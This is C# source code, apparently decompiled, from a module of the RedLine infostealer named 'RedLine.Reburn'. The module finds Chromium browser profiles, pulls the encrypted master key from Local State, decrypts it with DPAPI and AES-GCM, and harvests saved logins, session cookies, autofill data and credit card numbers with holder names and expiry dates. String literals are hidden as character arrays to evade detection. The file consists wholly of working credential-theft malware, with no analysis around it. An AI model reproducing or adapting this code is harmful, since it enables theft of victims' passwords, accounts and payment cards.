using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using RedLine.Reburn.Data.Extensions;
using RedLine.Reburn.Data.Helpers;
using RedLine.Reburn.Models.Browsers;
using RedLine.Reburn.Models.Info;
using RedLine.Reburn.Models.Serialization;

namespace RedLine.Reburn.Data.Browsers.Chromium;

public static class ChromiumEngine
{
	public static List<Browser> ParseBrowsers(IList<string> profiles)
	{
		List<Browser> list = new List<Browser>();
		try
		{
			object obj = new object();
			foreach (string profile in profiles)
			{
				bool flag = false;
				int num = 1;
				while (!flag)
				{
					Browser browser = new Browser();
					string dataFolder = string.Empty;
					string empty = string.Empty;
					try
					{
						dataFolder = new FileInfo(profile).Directory!.FullName;
						empty = ((!dataFolder.Contains(new string(new char[15]
						{
							'O', 'p', 'e', 'r', 'a', ' ', 'G', 'X', ' ', 'S',
							't', 'a', 'b', 'l', 'e'
						}))) ? (profile.Contains(Constants.RoamingAppData) ? GetRoamingName(dataFolder) : GetLocalName(dataFolder)) : new string(new char[8] { 'O', 'p', 'e', 'r', 'a', ' ', 'G', 'X' }));
						if (!string.IsNullOrEmpty(empty))
						{
							empty = empty[0].ToString().ToUpper() + empty.Remove(0, 1);
							string name = GetName(dataFolder);
							if (!string.IsNullOrEmpty(name))
							{
								browser.Name = empty;
								browser.Profile = name;
								browser.Credentials = MakeTries(() => EnumPasswords(dataFolder), (List<LoginPair> x) => x.Count > 0).IsNull();
								browser.Cookies = MakeTries(() => EnumCook(dataFolder), (List<Cookie> x) => x.Count > 0).IsNull();
								browser.Autofills = MakeTries(() => EnumFills(dataFolder), (List<Autofill> x) => x.Count > 0).IsNull();
								browser.CreditCards = MakeTries(() => EnumCC(dataFolder), (List<CreditCard> x) => x.Count > 0).IsNull();
							}
						}
					}
					catch (Exception)
					{
					}
					lock (obj)
					{
						IList<Cookie> cookies = browser.Cookies;
						if (cookies != null && cookies.Count > 0)
						{
							goto IL_029e;
						}
						IList<LoginPair> credentials = browser.Credentials;
						if (credentials != null && credentials.Count > 0)
						{
							goto IL_029e;
						}
						IList<CreditCard> creditCards = browser.CreditCards;
						if (creditCards != null && creditCards.Count > 0)
						{
							goto IL_029e;
						}
						IList<Autofill> autofills = browser.Autofills;
						if (autofills != null && autofills.Count > 0)
						{
							goto IL_029e;
						}
						num++;
						goto end_IL_022d;
						IL_029e:
						flag = true;
						list.Add(browser);
						end_IL_022d:;
					}
					if (num > 2)
					{
						flag = true;
					}
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static List<LoginPair> EnumPasswords(string profilePath)
	{
		List<LoginPair> list = new List<LoginPair>();
		try
		{
			string text = Path.Combine(profilePath, new string(new char[10] { 'L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a' }));
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = ParseLocalStateKey(profilePath);
			bool createdNew;
			string text2 = FileSystemHelper.TryCreateTemp(text, out createdNew);
			try
			{
				WindowsForm windowsForm = new WindowsForm(text2);
				windowsForm.ReadTable(new string(new char[6] { 'l', 'o', 'g', 'i', 'n', 's' }));
				for (int i = 0; i < windowsForm.RowLength; i++)
				{
					LoginPair loginPair = new LoginPair();
					try
					{
						loginPair = ReadData(windowsForm, i, chromeKey);
					}
					catch (Exception)
					{
					}
					if (loginPair.Password != "UNKNOWN")
					{
						list.Add(loginPair);
					}
				}
				return list;
			}
			catch (Exception)
			{
				return list;
			}
			finally
			{
				if (createdNew)
				{
					new FileInfo(text2).Delete();
				}
			}
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static List<Cookie> EnumCook(string profilePath)
	{
		List<Cookie> list = new List<Cookie>();
		try
		{
			string text = Path.Combine(profilePath, new string(new char[7] { 'C', 'o', 'o', 'k', 'i', 'e', 's' }));
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = ParseLocalStateKey(profilePath);
			bool createdNew;
			string text2 = FileSystemHelper.TryCreateTemp(text, out createdNew);
			try
			{
				WindowsForm windowsForm = new WindowsForm(text2);
				windowsForm.ReadTable(new string(new char[7] { 'c', 'o', 'o', 'k', 'i', 'e', 's' }));
				for (int i = 0; i < windowsForm.RowLength; i++)
				{
					Cookie cookie = null;
					try
					{
						Cookie cookie2 = new Cookie();
						cookie2.Host = windowsForm.ParseValue(i, new string(new char[8] { 'h', 'o', 's', 't', '_', 'k', 'e', 'y' })).Trim();
						cookie2.Http = windowsForm.ParseValue(i, new string(new char[8] { 'h', 'o', 's', 't', '_', 'k', 'e', 'y' })).Trim().StartsWith(".");
						cookie2.Path = windowsForm.ParseValue(i, new string(new char[4] { 'p', 'a', 't', 'h' })).Trim();
						cookie2.Secure = windowsForm.ParseValue(i, new string(new char[9] { 'i', 's', '_', 's', 'e', 'c', 'u', 'r', 'e' })).Contains("1");
						cookie2.Expires = Convert.ToInt64(windowsForm.ParseValue(i, new string(new char[11]
						{
							'e', 'x', 'p', 'i', 'r', 'e', 's', '_', 'u', 't',
							'c'
						})).Trim()) / 1000000L - 11644473600L;
						cookie2.Name = windowsForm.ParseValue(i, new string(new char[4] { 'n', 'a', 'm', 'e' })).Trim();
						cookie2.Value = DecryptChromium(windowsForm.ParseValue(i, new string(new char[15]
						{
							'e', 'n', 'c', 'r', 'y', 'p', 't', 'e', 'd', '_',
							'v', 'a', 'l', 'u', 'e'
						})), chromeKey);
						cookie = cookie2;
						if (cookie.Expires < 0L)
						{
							cookie.Expires = ToUnixTime(DateTime.Now.AddMonths(12));
						}
					}
					catch
					{
					}
					if (cookie != null)
					{
						list.Add(cookie);
					}
				}
			}
			catch
			{
			}
			if (createdNew)
			{
				File.Delete(text2);
				return list;
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	public static long ToUnixTime(DateTime date)
	{
		DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
		return Convert.ToInt64((date - dateTime).TotalSeconds);
	}

	private static List<Autofill> EnumFills(string profilePath)
	{
		List<Autofill> list = new List<Autofill>();
		try
		{
			string text = Path.Combine(profilePath, new string(new char[8] { 'W', 'e', 'b', ' ', 'D', 'a', 't', 'a' }));
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = ParseLocalStateKey(profilePath);
			bool createdNew;
			string text2 = FileSystemHelper.TryCreateTemp(text, out createdNew);
			try
			{
				WindowsForm windowsForm = new WindowsForm(text2);
				windowsForm.ReadTable(new string(new char[8] { 'a', 'u', 't', 'o', 'f', 'i', 'l', 'l' }));
				for (int i = 0; i < windowsForm.RowLength; i++)
				{
					Autofill autofill = null;
					try
					{
						string text3 = windowsForm.ParseValue(i, new string(new char[5] { 'v', 'a', 'l', 'u', 'e' })).Trim();
						if (text3.StartsWith(new string(new char[3] { 'v', '1', '0' })) || text3.StartsWith(new string(new char[3] { 'v', '1', '1' })))
						{
							text3 = DecryptChromium(text3, chromeKey);
						}
						Autofill autofill2 = new Autofill();
						autofill2.Name = windowsForm.ParseValue(i, new string(new char[4] { 'n', 'a', 'm', 'e' })).Trim();
						autofill2.Value = text3;
						autofill = autofill2;
					}
					catch
					{
					}
					if (autofill != null)
					{
						list.Add(autofill);
					}
				}
			}
			catch
			{
			}
			if (createdNew)
			{
				File.Delete(text2);
				return list;
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static List<CreditCard> EnumCC(string profilePath)
	{
		List<CreditCard> list = new List<CreditCard>();
		try
		{
			string text = Path.Combine(profilePath, new string(new char[8] { 'W', 'e', 'b', ' ', 'D', 'a', 't', 'a' }));
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = ParseLocalStateKey(profilePath);
			bool createdNew;
			string text2 = FileSystemHelper.TryCreateTemp(text, out createdNew);
			try
			{
				WindowsForm windowsForm = new WindowsForm(text2);
				windowsForm.ReadTable(new string(new char[12]
				{
					'c', 'r', 'e', 'd', 'i', 't', '_', 'c', 'a', 'r',
					'd', 's'
				}));
				for (int i = 0; i < windowsForm.RowLength; i++)
				{
					CreditCard creditCard = null;
					try
					{
						string text3 = DecryptChromium(windowsForm.ParseValue(i, new string(new char[21]
						{
							'c', 'a', 'r', 'd', '_', 'n', 'u', 'm', 'b', 'e',
							'r', '_', 'e', 'n', 'c', 'r', 'y', 'p', 't', 'e',
							'd'
						})), chromeKey).Replace(" ", string.Empty);
						CreditCard creditCard2 = new CreditCard();
						creditCard2.Holder = windowsForm.ParseValue(i, new string(new char[12]
						{
							'n', 'a', 'm', 'e', '_', 'o', 'n', '_', 'c', 'a',
							'r', 'd'
						})).Trim();
						creditCard2.ExpirationMonth = Convert.ToInt32(windowsForm.ParseValue(i, new string(new char[24]
						{
							'e', 'x', 'p', 'i', 'r', 'a', 's', '2', '1', 'a',
							't', 'i', 'o', 'n', '_', 'm', 'o', 'a', 's', '2',
							'1', 'n', 't', 'h'
						}).Replace("as21", string.Empty)).Trim());
						creditCard2.ExpirationYear = Convert.ToInt32(windowsForm.ParseValue(i, new string(new char[23]
						{
							'e', 'x', 'p', 'i', 'r', 'a', 'a', 's', '2', '1',
							't', 'i', 'o', 'n', '_', 'y', 'a', 's', '2', '1',
							'e', 'a', 'r'
						}).Replace("as21", string.Empty)).Trim());
						creditCard2.CardNumber = text3;
						creditCard2.CardType = DetectCreditCardType(text3);
						creditCard = creditCard2;
					}
					catch
					{
					}
					if (creditCard != null)
					{
						list.Add(creditCard);
					}
				}
			}
			catch
			{
			}
			if (createdNew)
			{
				File.Delete(text2);
				return list;
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static LoginPair ReadData(WindowsForm manager, int row, string chromeKey)
	{
		LoginPair loginPair = new LoginPair();
		try
		{
			if (manager.Fields.Contains(new string(new char[14]
			{
				'P', 'a', 's', 's', 'w', 'o', 'r', 'd', '_', 'v',
				'a', 'l', 'u', 'e'
			})))
			{
				loginPair.Host = manager.ParseValue(row, new string(new char[10] { 'O', 'r', 'i', 'g', 'i', 'n', '_', 'u', 'r', 'l' })).Trim();
				loginPair.Login = manager.ParseValue(row, new string(new char[14]
				{
					'U', 's', 'e', 'r', 'n', 'a', 'm', 'e', '_', 'v',
					'a', 'l', 'u', 'e'
				})).Trim();
				loginPair.Password = DecryptChromium(manager.ParseValue(row, new string(new char[14]
				{
					'P', 'a', 's', 's', 'w', 'o', 'r', 'd', '_', 'v',
					'a', 'l', 'u', 'e'
				})), chromeKey);
			}
			else if (manager.Fields.Contains(new string(new char[14]
			{
				'p', 'a', 's', 's', 'w', 'o', 'r', 'd', '_', 'v',
				'a', 'l', 'u', 'e'
			})))
			{
				loginPair.Host = manager.ParseValue(row, new string(new char[10] { 'o', 'r', 'i', 'g', 'i', 'n', '_', 'u', 'r', 'l' })).Trim();
				loginPair.Login = manager.ParseValue(row, new string(new char[14]
				{
					'u', 's', 'e', 'r', 'n', 'a', 'm', 'e', '_', 'v',
					'a', 'l', 'u', 'e'
				})).Trim();
				loginPair.Password = DecryptChromium(manager.ParseValue(row, new string(new char[14]
				{
					'p', 'a', 's', 's', 'w', 'o', 'r', 'd', '_', 'v',
					'a', 'l', 'u', 'e'
				})), chromeKey);
			}
		}
		catch (Exception)
		{
		}
		finally
		{
			loginPair.Login = (string.IsNullOrWhiteSpace(loginPair.Login) ? "UNKNOWN" : loginPair.Login);
			loginPair.Password = (string.IsNullOrWhiteSpace(loginPair.Password) ? "UNKNOWN" : loginPair.Password);
			loginPair.Host = (string.IsNullOrWhiteSpace(loginPair.Host) ? "UNKNOWN" : loginPair.Host);
		}
		return loginPair;
	}

	private static string DecryptChromium(string chiperText, string chromeKey)
	{
		string result = string.Empty;
		try
		{
			if (!chiperText.StartsWith(new string(new char[3] { 'v', '1', '0' })) && !chiperText.StartsWith(new string(new char[3] { 'v', '1', '1' })))
			{
				result = CryptoHelper.DecryptBlob(chiperText, (DataProtectionScope)0).Trim();
				return result;
			}
			result = DecryptV10(Convert.FromBase64String(chromeKey), chiperText);
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	private static string DecryptV10(byte[] bMasterKey, string chiperText)
	{
		Encoding encoding = Encoding.GetEncoding("windows-1251");
		byte[] array = new byte[bMasterKey.Length - 5];
		Array.Copy(bMasterKey, 5, array, 0, bMasterKey.Length - 5);
		return encoding.GetString(AesGcm.Decrypt(bMasterKey: CryptoHelper.DecryptBlob(array, (DataProtectionScope)0), bEncryptedData: encoding.GetBytes(chiperText)));
	}

	private static string GetName(string path)
	{
		try
		{
			string[] array = path.Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
			if (array[^2] == "User Data")
			{
				return array[^1];
			}
		}
		catch
		{
		}
		return "Unknown";
	}

	private static string GetRoamingName(string path)
	{
		try
		{
			return path.Split(new string[1]
			{
				new string(new char[16]
				{
					'A', 'p', 'p', 'D', 'a', 't', 'a', '\\', 'R', 'o',
					'a', 'm', 'i', 'n', 'g', '\\'
				})
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries)[0];
		}
		catch
		{
		}
		return string.Empty;
	}

	private static string GetLocalName(string path)
	{
		try
		{
			string[] array = path.Split(new string[1]
			{
				new string(new char[14]
				{
					'A', 'p', 'p', 'D', 'a', 't', 'a', '\\', 'L', 'o',
					'c', 'a', 'l', '\\'
				})
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
			return array[0] + "_[" + array[1] + "]";
		}
		catch
		{
		}
		return string.Empty;
	}

	public static T MakeTries<T>(Func<T> func, Func<T, bool> success)
	{
		int num = 1;
		T val = func();
		do
		{
			if (!success(val))
			{
				val = func();
				num++;
				continue;
			}
			return val;
		}
		while (num <= 2);
		return val;
	}

	private static string ParseLocalStateKey(string profilePath)
	{
		string result = string.Empty;
		string empty = string.Empty;
		try
		{
			string[] array = profilePath.Split(new string[1] { "\\" }, StringSplitOptions.RemoveEmptyEntries);
			array = array.Take(array.Length - 1).ToArray();
			empty = Path.Combine(string.Join("\\", array), "Local State");
			if (!File.Exists(empty))
			{
				empty = Path.Combine(profilePath, "Local State");
			}
			if (File.Exists(empty))
			{
				try
				{
					bool createdNew;
					string path = FileSystemHelper.TryCreateTemp(empty, out createdNew);
					result = File.ReadAllText(path).FromJSON<LocalState>().os_crypt.encrypted_key;
					if (!createdNew)
					{
						return result;
					}
					File.Delete(path);
					return result;
				}
				catch (Exception)
				{
					return result;
				}
			}
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static string DetectCreditCardType(string number)
	{
		return (from x in Constants.CreditCardTypes
			where new Regex(x.Value).Match(number.Replace(" ", "")).Success
			select x.Key).FirstOrDefault() ?? "Unknown";
	}
}
